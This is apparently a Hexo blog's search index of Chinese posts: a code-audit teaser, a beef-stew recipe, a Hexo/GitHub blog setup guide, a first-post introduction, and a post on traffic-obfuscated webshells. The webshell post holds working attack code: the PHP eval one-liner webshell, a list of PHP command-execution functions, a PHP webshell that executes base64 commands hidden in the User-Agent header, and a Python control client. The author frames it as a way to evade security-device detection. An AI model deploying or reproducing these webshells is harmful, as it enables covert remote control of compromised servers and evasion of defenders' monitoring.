<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>某X服审计</title>
    <link href="/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/"/>
    <url>/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。</p><p><img src="/images/edr/1.JPG"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>土豆牛腩</title>
    <link href="/2020/08/11/%E5%9C%9F%E8%B1%86%E7%89%9B%E8%85%A9/"/>
    <url>/2020/08/11/%E5%9C%9F%E8%B1%86%E7%89%9B%E8%85%A9/</url>
    
    <content type="html"><![CDATA[<p>闲来无事，做一波美食。<br><img src="/images/Potato_beef_brisket/goulash.JPG">  </p><p><img src="/images/Potato_beef_brisket/potato.JPG">  </p><p><img src="/images/Potato_beef_brisket/potato_beef_brisket_2.JPG">  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>流量混淆webshell</title>
    <link href="/2020/08/06/%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86webshell/"/>
    <url>/2020/08/06/%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86webshell/</url>
    
    <content type="html"><![CDATA[<h2 id="webshell是什么？"><a href="#webshell是什么？" class="headerlink" title="webshell是什么？"></a>webshell是什么？</h2><p>刚刚接触安全的时候，对于webshell这个概念还是十分的惊奇。只记得当时带课的老师才测试网站上传了一个php文件（老师说是webshell），然后用了一个软件就直接可以控制测试网站了。当时觉的真TM的牛皮，那时起觉的安全还挺有意思的。  </p><h3 id="回忆复现"><a href="#回忆复现" class="headerlink" title="回忆复现"></a>回忆复现</h3><p><font size=1 color=Blue><em>到底websehll是什么？那就来回忆下当前的情景。</em></font><br>工具: phpstudy、菜刀、一句话webshell<code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code>。<br>操作流程:    </p><ul><li>将webshell保存为后缀为.php的文件并上传到相应的web目录下。  </li></ul><p><img src="/images/2020-8-6/yijuhua.png"></p><ul><li>使用中国菜刀进行连接  </li></ul><blockquote><p>中国菜刀 是一款由中国大牛开发的webshell后门管理工具。配置简便、功能强大、使用方便，可以说是一款强大好用的“web管理工具”。   </p></blockquote><p><img src="/images/2020-8-6/caidao_config.png"></p><p><img src="/images/2020-8-6/caidao.png"></p><h3 id="菜刀分析"><a href="#菜刀分析" class="headerlink" title="菜刀分析"></a>菜刀分析</h3><ul><li>在菜刀客户端中输入ipconfig命令，然后通过winshark抓包分析菜刀运行的原理。  </li></ul><p><img src="/images/2020-8-6/ipconfig.png">  </p><p><img src="/images/2020-8-6/caidao_pcap.png">  </p><ul><li>菜刀将执行的命令通过base64加密传入webshell中，对psot字段进行base64解密看看其详情信息<a href="https://blog.csdn.net/gscaiyucheng/article/details/24911375">(菜刀分析参加文章)</a>。  </li></ul><p><img src="/images/2020-8-6/base64.png">  </p><ol><li><p>@ini_set(“display_errors”,”0”);临时关闭PHP的错误显示功能</p></li><li><p>@set_time_limit(0);防止像dir、上传文件大马时超时</p></li><li><p>@set_magic_quotes_runtime(0);关闭魔术引号，这东西在4.0以后就不怎么用了</p></li><li><p>$p=’cmd’;执行cmd</p></li><li><p>$s=’cd /d D:\&amp;ipconfig&echo;执行ipconfg并输出</p></li></ol><h3 id="一句话分析"><a href="#一句话分析" class="headerlink" title="一句话分析"></a>一句话分析</h3><p><code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code><br>为什么如此简单的一句话就可以拥有如此神奇的力量，让他足以控制一台计算机。其实是计算机语言的魅力，每一种计算机语言都是为操作计算机系统而生。当然webshell也是计算机语言所写，其又被称为服务器控制端，那如过被攻击者利用就被称之为shell了。  </p><ul><li><p>以php语言为案例，攻击者通过各种函数、变量拼接，从而构造出命令执行函数，php 常见命令执行函数: </p><pre><code class="hljs aidl">$&#123;&#125;Eval()Assert()preg_replace()create_function()array_map()call_user_func()&#x2F;call_user_func_array()array_filter()usort(),uasort()</code></pre></li><li><p>通过post传入payload执行命令并回显<br><img src="/images/2020-8-6/post.png">  </p></li><li><p>winshark抓包<br><img src="/images/2020-8-6/post_pcap.png">  </p></li></ul><p>相信看到这一步应该对webshell有一个大概的了解，简单理解了webshell的执行原理。</p><h2 id="流量加密"><a href="#流量加密" class="headerlink" title="流量加密"></a>流量加密</h2><p>目前市场上的安全设备对于恶意数据流都可精准检测其特征，而常规的一句话木马、菜刀等特征过于明显。而且大部分的黑客工具都被列入特征库，所以攻击方的攻击手法很容易被针对，攻击链路也很容易被还原。</p><h3 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h3><p>常规的webshell是将所需的payload通过post进行传参，很容易被流量设备检测。当然，你也可以使用其他地方进行传参。</p><ul><li>例如：user_agent加密进行传参，然后再解密执行命令。   </li></ul><p><img src="/images/2020-8-6/post_encrypt.png">  </p><ul><li>winshark抓包  </li></ul><p><img src="/images/2020-8-6/post_encrypt_pcap.png">   </p><h3 id="webshell源码"><a href="#webshell源码" class="headerlink" title="webshell源码"></a>webshell源码</h3><pre><code class="hljs aidl">&lt;?php$dd &#x3D; $_SERVER[&#39;HTTP_USER_AGENT’];&#x2F;&#x2F;获取user_agent参数$qq &#x3D; base64_decode($dd);&#x2F;&#x2F;解密user_agent参数$jjj &#x3D; exec ($qq,$out);&#x2F;&#x2F;执行user_agent参数for ($i&#x3D;0 ;$i &lt; count($out) ;$i++)&#123;    $ls &#x3D; $ls.$out[$i].&quot;\n&quot;;&#125;echo base64_encode($ls);&#x2F;&#x2F;加密输入执行后的系统命令?&gt;</code></pre><h3 id="客户端源码"><a href="#客户端源码" class="headerlink" title="客户端源码"></a>客户端源码</h3><p>当然用浏览器手工去输入shell着实不太方便，写一个简单的控制脚本。</p><pre><code class="hljs aidl">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-import requestsimport base64str_1 &#x3D; &quot;&quot;headers &#x3D; &#123;        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;,        &quot;User-Agent&quot;: &quot;adwd&quot;,        &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;,        &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;    &#125;while True:    str_1 &#x3D; input(&quot;please input cmd:&quot;)    str_1 &#x3D; bytes(str_1, encoding&#x3D;&quot;gbk&quot;)    str_1 &#x3D; base64.b64encode(str_1)    headers[&#39;User-Agent&#39;]&#x3D;str_1    ls &#x3D; requests.get(url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php&quot;,headers&#x3D;headers)#url更改位置    ls_1 &#x3D; ls.content    ls_1 &#x3D; base64.b64decode(ls_1)    ls_2 &#x3D; str (ls_1, encoding&#x3D;&quot;gbk&quot;)    print (ls_2)</code></pre><h2 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h2><p>上面的加密user_agent的特征还是较为明显。新思路:客户端将所需的payload通过base64加密进行拆分，嵌入正常的user_agent中，然后传入服务器。Webshell再从user_agent中提取payload解密执行，将回显命令通过base64+assic移位进行加密输出。客户端再对加密回显进行解密。 </p><h3 id="使用详情"><a href="#使用详情" class="headerlink" title="使用详情"></a>使用详情</h3><p>通过上面思路，分别编写了php与jsp的webshell，还有python客户端。当然目前并不支持文件上传，和其他高级功能，后续再持续更新。<br><a href="https://github.com/YLL-F1/--jsp-php">源码下载</a><br><img src="/images/2020-8-6/complete.png">  </p><p><img src="/images/2020-8-6/complete_pcap.png">  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客搭建</title>
    <link href="/2020/08/05/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/08/05/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="安装流程（windows环境）"><a href="#安装流程（windows环境）" class="headerlink" title="安装流程（windows环境）"></a>安装流程（windows环境）</h2><h3 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h3><p>官网下载node.exe并安装<br><img src="/images/2020-8-5/node.png"></p><h3 id="安装Git-→-安装Hexo"><a href="#安装Git-→-安装Hexo" class="headerlink" title="安装Git → 安装Hexo"></a>安装Git → 安装Hexo</h3><p>官网下载git.exe并安装<a href="https://hexo.io/zh-cn/docs/index.html">(安装教程)</a><br>打开 git bash 输入以下命令</p><hr><p><code>npm install -g hexo-cli</code><br>Hexo 完成后，请特别的注意看注释。<br>hexo init <folder>  folder指我们要安装的博客根目录<br><code>hexo init blog</code> #指的是在当前文件夹下新建blog目录作为博客的根目录<br><code>cd</code><br><code>npm install</code>  安装所有的依赖包<br><code>hexo server</code></p><hr><p><img src="/images/2020-8-5/hexo-s.png"><br><img src="/images/2020-8-5/index.png"></p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>hexo支持自由更换主题，并且当更换主题是内容不变（适合喜新厌旧的小伙伴）。我使用的主题是hexo-theme-fluid<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/">(使用文档)</a><br>将主题拷贝到站点的themes目录下<br><code>git clone https://github.com/fluid-dev/hexo-theme-fluid.git themes/</code><br>同时修改<code>_config.yml</code>中theme字段为<code>hexo-theme-fluid</code><br><code>hexo clean</code><br><code>hexo server</code><br><img src="/images/2020-8-5/fulid.png">  </p><h2 id="Github托管"><a href="#Github托管" class="headerlink" title="Github托管"></a>Github托管</h2><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><p>在Github官网注册账号，这样我们便拥有的发布的授权。github有许多的功能，发布blog也是我最近才发现的，当然我也正在尝试挖掘其他有趣的function。  </p><h3 id="创建repository"><a href="#创建repository" class="headerlink" title="创建repository"></a>创建repository</h3><p><img src="/images/2020-8-5/github.png"></p><h3 id="设置ssh连接"><a href="#设置ssh连接" class="headerlink" title="设置ssh连接"></a>设置ssh连接</h3><p>设置 SSH 远程连接设置Git的user name和email<br><code>git config --global user.name &quot;xxx&quot;</code><br><code>git config --global user.email &quot;xxx@qq.com&quot;</code><br>本地生成密钥<br><code>ssh-keygen -t rsa -C &quot;xxx@qq.com&quot;</code><br>将生成的<code>id_rsa.pub</code>内容粘贴到github上。<br><img src="/images/2020-8-5/ssh-key.png"></p><h3 id="发布到Github"><a href="#发布到Github" class="headerlink" title="发布到Github"></a>发布到Github</h3><p>在博客的配置文件中_config.yml 中 末尾添加Deploy</p><pre><code class="deploy:">  type: git  repo:    github: git@github.com:xxx/xxx.github.io.git,master</code></pre><p>在cmd中执行<code>hexo clean</code> <code>hexo g -d</code>  </p><h2 id="success"><a href="#success" class="headerlink" title="success"></a>success</h2><p>访问<a href="https://yll-f1.github.io/">https://yll-f1.github.io</a><br><img src="/images/2020-8-5/success.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第一篇属于自己的博客</title>
    <link href="/2020/08/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/08/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>  之前一直在第三方记录生活与工作所碰到的故事，但是由于种种原因，第三方所提供的服务总是出现问题。</p><h2 id="example"><a href="#example" class="headerlink" title="example:"></a><em>example:</em></h2><p>  服务器正在维护中，您的文章目前处于维护状态，您的的文章目前处于审核状态。。。。。  所以，我找了大量的博客搭建资料。发现github原来是一个相当不错的博客搭建平台，既不需要购买VPS，也不需要购买域名，并且又方便转移。</p><h4 id="自律"><a href="#自律" class="headerlink" title="自律"></a>自律</h4><p>当然写博客也是为了提高自己的自律性。因为好多时候总是把时间浪费在LOL、手游、抖音等等上，感觉有那么一点点荒废（哈哈）。所以说想把这些时间用在博客身上，也未必不是一件很有意义的事情。当然我要严格要求自己每周更新一篇文章，内容不限（技术、生活、运动、旅行、风景等），让生活变的更有意义。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
